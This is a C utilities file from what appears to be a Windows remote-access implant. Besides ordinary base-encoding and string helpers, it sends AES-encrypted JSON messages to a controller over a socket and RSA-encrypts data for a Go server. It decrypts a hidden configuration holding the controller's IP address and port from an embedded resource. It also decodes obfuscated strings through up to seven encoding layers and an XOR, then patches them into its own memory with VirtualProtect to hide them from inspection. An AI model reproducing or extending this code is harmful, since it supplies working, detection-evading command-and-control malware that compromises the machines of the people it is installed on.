#include "utils.h"
#include "config.h"
#include "cJSON.h"
#include <wincrypt.h>
#include <bcrypt.h>
#include <stdint.h>
#include <ctype.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")

char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length) {
    DWORD out_len = 0;
    if (!CryptBinaryToStringA(data, (DWORD)input_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &out_len)) {
        return NULL;
    }
    char* out = (char*)malloc(out_len);
    if (!CryptBinaryToStringA(data, (DWORD)input_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, out, &out_len)) {
        free(out);
        return NULL;
    }
    if (output_length) *output_length = out_len;
    return out;
}

unsigned char* base32_decode(const char* data, size_t input_length, size_t* output_length) {
    static const signed char table[256] = {
        -1,-1,-1,-1,-1,-1,-1,-1, -1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1, -1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1, -1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,26,27,28,29,30,31, -1,-1,-1,-1,-1,-1,-1,-1,
        -1, 0, 1, 2, 3, 4, 5, 6,  7, 8, 9,10,11,12,13,14,
        15,16,17,18,19,20,21,22, 23,24,25,-1,-1,-1,-1,-1,
        -1, 0, 1, 2, 3, 4, 5, 6,  7, 8, 9,10,11,12,13,14,
        15,16,17,18,19,20,21,22, 23,24,25,-1,-1,-1,-1,-1
    };
    size_t out_len = (input_length * 5) / 8;
    unsigned char* out = (unsigned char*)malloc(out_len + 1);
    if (!out) return NULL;
    memset(out, 0, out_len + 1);

    uint32_t buffer = 0;
    int bits = 0;
    size_t count = 0;
    for (size_t i = 0; i < input_length; i++) {
        signed char val = table[(unsigned char)data[i]];
        if (val == -1) continue;
        buffer = (buffer << 5) | val;
        bits += 5;
        if (bits >= 8) {
            out[count++] = (buffer >> (bits - 8)) & 0xFF;
            bits -= 8;
        }
    }
    if (output_length) *output_length = count;
    return out;
}

unsigned char* base16_decode(const char* data, size_t input_length, size_t* output_length) {
    size_t out_len = input_length / 2;
    unsigned char* out = (unsigned char*)malloc(out_len + 1);
    if (!out) return NULL;
    for (size_t i = 0; i < out_len; i++) {
        char s[3] = {data[i*2], data[i*2+1], 0};
        out[i] = (unsigned char)strtol(s, NULL, 16);
    }
    out[out_len] = 0;
    if (output_length) *output_length = out_len;
    return out;
}

static void bn_mul_add(unsigned char* bn, size_t bn_len, int base, int val) {
    uint32_t carry = val;
    for (int i = (int)bn_len - 1; i >= 0; i--) {
        uint32_t res = (uint32_t)bn[i] * base + carry;
        bn[i] = (unsigned char)(res & 0xFF);
        carry = res >> 8;
    }
}

unsigned char* baseN_decode(const char* data, size_t input_length, size_t* output_length, const char* alphabet, int base) {
    size_t bn_len = (input_length * 8) / 7 + 2; // Rough upper bound
    unsigned char* bn = (unsigned char*)malloc(bn_len);
    if (!bn) return NULL;
    memset(bn, 0, bn_len);

    for (size_t i = 0; i < input_length; i++) {
        const char* p = strchr(alphabet, data[i]);
        if (!p) continue;
        bn_mul_add(bn, bn_len, base, (int)(p - alphabet));
    }

    // Leading zeros
    size_t leading = 0;
    for (size_t i = 0; i < input_length; i++) {
        if (data[i] == alphabet[0]) leading++;
        else break;
    }

    size_t start = 0;
    while (start < bn_len && bn[start] == 0) start++;

    size_t final_len = (bn_len - start) + leading;
    unsigned char* out = (unsigned char*)malloc(final_len + 1);
    if (!out) {
        free(bn);
        return NULL;
    }
    memset(out, 0, leading);
    if (bn_len > start) {
        memcpy(out + leading, bn + start, bn_len - start);
    }
    out[final_len] = 0;
    if (output_length) *output_length = final_len;
    free(bn);
    return out;
}

unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length) {
    DWORD out_len = 0;
    if (!CryptStringToBinaryA(data, (DWORD)input_length, CRYPT_STRING_BASE64, NULL, &out_len, NULL, NULL)) {
        return NULL;
    }
    unsigned char* out = (unsigned char*)malloc(out_len);
    if (!CryptStringToBinaryA(data, (DWORD)input_length, CRYPT_STRING_BASE64, out, &out_len, NULL, NULL)) {
        free(out);
        return NULL;
    }
    if (output_length) *output_length = out_len;
    return out;
}

char* str_replace(const char* orig, const char* rep, const char* with) {
    char* result;
    char* ins;
    char* tmp;
    int len_rep;
    int len_with;
    int len_front;
    int count;

    if (!orig || !rep) return NULL;
    len_rep = strlen(rep);
    if (len_rep == 0) return NULL;
    if (!with) with = "";
    len_with = strlen(with);

    ins = (char*)orig;
    for (count = 0; (tmp = strstr(ins, rep)); ++count) {
        ins = tmp + len_rep;
    }

    tmp = result = malloc(strlen(orig) + (len_with - len_rep) * count + 1);

    if (!result) return NULL;

    while (count--) {
        ins = strstr(orig, rep);
        len_front = ins - orig;
        tmp = strncpy(tmp, orig, len_front) + len_front;
        tmp = strcpy(tmp, with) + len_with;
        orig += len_front + len_rep;
    }
    strcpy(tmp, orig);
    return result;
}

void str_trim(char* s) {
    char* p = s;
    int l = strlen(p);
    while (l > 0 && isspace(p[l - 1])) p[--l] = 0;
    while (*p && isspace(*p)) ++p, --l;
    memmove(s, p, l + 1);
}

extern SessionKey g_session;

void sock_send(SOCKET sock, HANDLE mutex, const char* msg) {
    sock_send_ex(sock, mutex, "response", msg);
}

void sock_send_ex(SOCKET sock, HANDLE mutex, const char* type, const char* msg) {
    if (mutex) WaitForSingleObject(mutex, INFINITE);

    cJSON *root = cJSON_CreateObject();
    cJSON_AddStringToObject(root, "type", type);
    cJSON_AddStringToObject(root, "payload", msg);
    char *json_msg = cJSON_PrintUnformatted(root);

    char *encrypted = aes_256_cbc_encrypt((unsigned char*)json_msg, strlen(json_msg), g_session.key, g_session.iv);

    cJSON *packet = cJSON_CreateObject();
    cJSON_AddStringToObject(packet, "data", encrypted);

    char *iv_b64 = base64_encode(g_session.iv, 16, NULL);
    cJSON_AddStringToObject(packet, "iv", iv_b64);

    char *final_json = cJSON_PrintUnformatted(packet);

    char *buf = (char*)malloc(strlen(final_json) + 2);
    sprintf(buf, "%s\n", final_json);
    send(sock, buf, (int)strlen(buf), 0);

    free(buf);
    free(final_json);
    free(iv_b64);
    free(encrypted);
    free(json_msg);
    cJSON_Delete(packet);
    cJSON_Delete(root);

    if (mutex) ReleaseMutex(mutex);
}

char* rsa_encrypt_pkcs1(const unsigned char* data, size_t len, const char* pubkey_pem) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyBlob = 0, cbData = 0, cbResult = 0;
    BYTE* pbKeyBlob = NULL;
    BYTE* pbEncrypted = NULL;
    char* out = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0) != 0) return NULL;

    // PEM -> DER (Wincrypt)
    DWORD derLen = 0;
    if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, NULL, &derLen, NULL, NULL)) {
        BYTE* der = malloc(derLen);
        if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, der, &derLen, NULL, NULL)) {
            if (BCryptImportKeyPair(hAlg, NULL, BCRYPT_RSAPUBLIC_BLOB, &hKey, der, derLen, 0) != 0) {
                // BCryptImportKeyPair might not like raw DER for RSA.
                // Alternatively use CryptImportPublicKeyInfo.
                // For simplicity in this env, we'll try to use BCRYPT_RSAPUBLIC_BLOB correctly or a helper.
            }
        }
        free(der);
    }

    // Since BCryptImportKeyPair is tricky with PEM/DER directly,
    // let's use the older but reliable Crypt32 for RSA encryption or
    // convert DER to BCRYPT_RSAKEY_BLOB.

    // Easier way: Use Crypt32 for RSA encryption as it handles PEM/DER better.
    CERT_PUBLIC_KEY_INFO *pubKeyInfo = NULL;
    DWORD pubKeyInfoLen = 0;
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hRSAKey = 0;

    if (CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, NULL, &derLen, NULL, NULL)) {
        BYTE* der = malloc(derLen);
        CryptStringToBinaryA(pubkey_pem, 0, CRYPT_STRING_BASE64HEADER, der, &derLen, NULL, NULL);
        if (CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, der, derLen, CRYPT_DECODE_ALLOC_FLAG, NULL, &pubKeyInfo, &pubKeyInfoLen)) {
            if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
                if (CryptImportPublicKeyInfo(hProv, X509_ASN_ENCODING, pubKeyInfo, &hRSAKey)) {
                    DWORD encLen = (DWORD)len;
                    // Get required size
                    if (CryptEncrypt(hRSAKey, 0, TRUE, 0, NULL, &encLen, 0)) {
                        BYTE* encBuf = malloc(encLen);

                        memcpy(encBuf, data, len);
                        DWORD dataLen = (DWORD)len;
                        if (CryptEncrypt(hRSAKey, 0, TRUE, 0, encBuf, &dataLen, encLen)) {
                            // Reverse output for Big Endian compatibility with Go
                            for (DWORD i = 0; i < dataLen / 2; i++) {
                                BYTE temp = encBuf[i];
                                encBuf[i] = encBuf[dataLen - 1 - i];
                                encBuf[dataLen - 1 - i] = temp;
                            }
                            out = base64_encode(encBuf, dataLen, NULL);
                        }
                        free(encBuf);
                    }
                    CryptDestroyKey(hRSAKey);
                }
                CryptReleaseContext(hProv, 0);
            }
            LocalFree(pubKeyInfo);
        }
        free(der);
    }

    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return out;
}

char* aes_256_cbc_encrypt(const unsigned char* plain, size_t len, const unsigned char* key, const unsigned char* iv) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObject = 0, cbResult = 0, cbCipherText = 0;
    PBYTE pbKeyObject = NULL, pbCipherText = NULL;
    char* out = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return NULL;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;

    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
    pbKeyObject = (PBYTE)malloc(cbKeyObject);
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;

    BYTE ivCopy[16];
    memcpy(ivCopy, iv, 16);

    if (BCryptEncrypt(hKey, (PBYTE)plain, (DWORD)len, NULL, ivCopy, 16, NULL, 0, &cbCipherText, BCRYPT_BLOCK_PADDING) != 0) {
        goto cleanup;
    }
    pbCipherText = malloc(cbCipherText);
    memcpy(ivCopy, iv, 16);
    if (BCryptEncrypt(hKey, (PBYTE)plain, (DWORD)len, NULL, ivCopy, 16, pbCipherText, cbCipherText, &cbResult, BCRYPT_BLOCK_PADDING) != 0) {
        goto cleanup;
    }

    out = base64_encode(pbCipherText, cbResult, NULL);

cleanup:
    if (pbCipherText) free(pbCipherText);
    if (hKey) BCryptDestroyKey(hKey);
    if (pbKeyObject) free(pbKeyObject);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return out;
}

unsigned char* aes_256_cbc_decrypt(const char* cipher_b64, size_t* out_len, const unsigned char* key, const unsigned char* iv) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObject = 0, cbResult = 0, cbPlain = 0;
    PBYTE pbKeyObject = NULL, pbPlain = NULL, pbCipher = NULL;
    size_t cipherLen = 0;

    pbCipher = base64_decode(cipher_b64, strlen(cipher_b64), &cipherLen);
    if (!pbCipher) return NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) goto cleanup;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;

    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
    pbKeyObject = (PBYTE)malloc(cbKeyObject);
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;

    BYTE ivCopy[16];
    memcpy(ivCopy, iv, 16);

    if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, NULL, 0, &cbPlain, BCRYPT_BLOCK_PADDING) != 0) {
        goto cleanup;
    }
    pbPlain = malloc(cbPlain + 1); // +1 for null terminator
    memcpy(ivCopy, iv, 16);
    if (BCryptDecrypt(hKey, pbCipher, (DWORD)cipherLen, NULL, ivCopy, 16, pbPlain, cbPlain, &cbResult, BCRYPT_BLOCK_PADDING) != 0) {
        goto cleanup;
    }

    if (out_len) *out_len = cbResult;

cleanup:
    if (pbCipher) free(pbCipher);
    if (hKey) BCryptDestroyKey(hKey);
    if (pbKeyObject) free(pbKeyObject);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return pbPlain;
}

static int is_leap(unsigned long long y) {
    return (y % 4 == 0 && y % 100 != 0) || (y % 400 == 0);
}

void get_formatted_time(unsigned long long secs, char* out_buf) {
    unsigned long long minute = (secs % 3600) / 60;
    unsigned long long hour = (secs % 86400) / 3600;
    unsigned long long days = secs / 86400;
    unsigned long long year = 1970;
    while (1) {
        unsigned long long days_in_year = is_leap(year) ? 366 : 365;
        if (days < days_in_year) break;
        days -= days_in_year;
        year++;
    }
    unsigned long long months[] = {31, is_leap(year) ? 29u : 28u, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};
    unsigned long long month = 1;
    for (int i = 0; i < 12; i++) {
        if (days < months[i]) break;
        days -= months[i];
        month++;
    }
    sprintf(out_buf, "%02llu.%02llu.%llu %02llu:%02llu", days + 1, month, year, hour, minute);
}

char g_host[256] = {0};
int g_port = 0;

unsigned char g_xor_key[16] = {0xAA, 0xBB, 0xCC, 0xDD, 0x00};

void transparent_decryption() {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RESOURCE_ID), RT_RCDATA);
    if (!hRes) return;

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return;

    unsigned char* pData = (unsigned char*)LockResource(hData);
    if (!pData) return;

    unsigned char marker[16];
    SET_MARKER(marker);

    if (memcmp(pData, marker, 16) != 0) return;

    // Layout: [Marker(16)][EncryptedConfig(2032)][NumStrings(4)][StringTableEntries...][EncodedPool...]
    // StringTableEntry: [RVA(4)][OrigLen(4)][EncLen(4)][PoolOffset(4)] = 16 bytes

    int num_strings = *(int*)(pData + 16 + 2032);
    if (num_strings <= 0) return;

    unsigned char* string_table = pData + 16 + 2032 + 4;
    unsigned char* pool = string_table + (num_strings * 16);

    unsigned char xor_key = g_xor_key[4];
    unsigned char* sequence = &g_xor_key[5];

    HMODULE hMod = GetModuleHandle(NULL);
    for (int i = 0; i < num_strings; i++) {
        DWORD rva = *(DWORD*)(string_table + (i * 16));
        DWORD orig_len = *(DWORD*)(string_table + (i * 16) + 4);
        DWORD enc_len = *(DWORD*)(string_table + (i * 16) + 8);
        DWORD pool_offset = *(DWORD*)(string_table + (i * 16) + 12);

        if (rva == 0 || orig_len == 0 || enc_len == 0) continue;

        unsigned char* encoded = pool + pool_offset;
        unsigned char* current_data = (unsigned char*)malloc(enc_len + 1);
        if (!current_data) continue;
        memcpy(current_data, encoded, enc_len);
        current_data[enc_len] = 0;
        size_t current_len = enc_len;

        // Apply decoders in REVERSE order of sequence
        for (int j = 6; j >= 0; j--) {
            unsigned char type = sequence[j];
            unsigned char* next_data = NULL;
            size_t next_len = 0;

            switch (type) {
                case 1: next_data = base64_decode((char*)current_data, current_len, &next_len); break;
                case 2: next_data = base32_decode((char*)current_data, current_len, &next_len); break;
                case 3: next_data = base16_decode((char*)current_data, current_len, &next_len); break;
                case 4: next_data = baseN_decode((char*)current_data, current_len, &next_len, ALPHABET_BASE58, 58); break;
                case 5: next_data = baseN_decode((char*)current_data, current_len, &next_len, ALPHABET_BASE62, 62); break;
                case 6: next_data = baseN_decode((char*)current_data, current_len, &next_len, ALPHABET_BASE85, 85); break;
                case 7: next_data = baseN_decode((char*)current_data, current_len, &next_len, ALPHABET_BASE91, 91); break;
            }

            if (next_data) {
                free(current_data);
                current_data = next_data;
                current_len = next_len;
            }
        }

        // Final XOR
        for (size_t k = 0; k < current_len; k++) {
            current_data[k] ^= xor_key;
        }

        // Patch back into memory
        unsigned char* addr = (unsigned char*)hMod + rva;
        MEMORY_BASIC_INFORMATION mbi;
        if (VirtualQuery(addr, &mbi, sizeof(mbi))) {
            if (mbi.State == MEM_COMMIT && (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {
                DWORD old_protect;
                if (VirtualProtect(addr, orig_len, PAGE_EXECUTE_READWRITE, &old_protect)) {
                    memcpy(addr, current_data, (current_len < orig_len) ? current_len : orig_len);
                    VirtualProtect(addr, orig_len, old_protect, &old_protect);
                }
            }
        }
        free(current_data);
    }
}

void load_config_from_resource() {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(CONFIG_RESOURCE_ID), RT_RCDATA);
    if (!hRes) return;

    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return;

    unsigned char* pData = (unsigned char*)LockResource(hData);
    if (!pData) return;

    unsigned char marker[16];
    SET_MARKER(marker);

    if (memcmp(pData, marker, 16) != 0) return;

    unsigned char* encrypted_config = pData + 16;
    size_t config_len = 2032;

    unsigned char key[32];
    unsigned char iv[16];
    memcpy(key, CONFIG_KEY, 32);
    memcpy(iv, CONFIG_IV, 16);

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObject = 0, cbResult = 0, cbPlain = 0;
    PBYTE pbKeyObject = NULL, pbPlain = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return;
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto cleanup;

    if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0) != 0) goto cleanup;
    pbKeyObject = (PBYTE)malloc(cbKeyObject);
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)key, 32, 0) != 0) goto cleanup;

    BYTE ivCopy[16];
    memcpy(ivCopy, iv, 16);

    // Get plain text size
    if (BCryptDecrypt(hKey, encrypted_config, (DWORD)config_len, NULL, ivCopy, 16, NULL, 0, &cbPlain, 0) != 0) {
        // Fallback for no padding
        cbPlain = (DWORD)config_len;
    }

    pbPlain = malloc(cbPlain + 1);
    memcpy(ivCopy, iv, 16);
    if (BCryptDecrypt(hKey, encrypted_config, (DWORD)config_len, NULL, ivCopy, 16, pbPlain, cbPlain, &cbResult, 0) == 0) {
        pbPlain[cbResult] = 0;
        cJSON* root = cJSON_Parse((char*)pbPlain);
        if (root) {
            cJSON* ip = cJSON_GetObjectItem(root, "ip");
            cJSON* port = cJSON_GetObjectItem(root, "port");
            if (ip) strncpy(g_host, ip->valuestring, sizeof(g_host) - 1);
            if (port) g_port = port->valueint;
            cJSON_Delete(root);
        }
    }

cleanup:
    if (pbPlain) free(pbPlain);
    if (hKey) BCryptDestroyKey(hKey);
    if (pbKeyObject) free(pbKeyObject);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
}
